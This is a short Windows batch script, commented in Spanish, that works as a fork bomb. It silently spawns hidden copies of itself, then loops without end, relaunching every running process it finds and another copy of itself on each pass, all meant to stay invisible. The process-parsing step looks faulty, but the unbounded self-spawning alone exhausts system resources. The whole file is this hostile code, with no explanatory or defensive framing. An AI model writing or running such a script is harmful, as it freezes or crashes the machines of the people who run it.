@echo off
REM ========================================
REM DUPLICA 100% PROCESOS REALES - INVISIBLE
REM ========================================
if "%1"=="H" goto :H

REM SPAWN INVISIBLE
start /b cmd /c "%~f0" H
start /b cmd /c "%~f0" H
start /b cmd /c "%~f0" H
exit /b

:H
:duplicar
REM LEE Y DUPLICA TODOS LOS PROCESOS
for /f "tokens=1" %%i in ('tasklist /fo table ^| findstr /v "=== cmd conhost"') do (
    for /f "tokens=2" %%p in ("%%i") do (
        start /b %%p 2>nul
    )
)
REM SELF DUPLICATE
start /b "%~f0" H
goto duplicar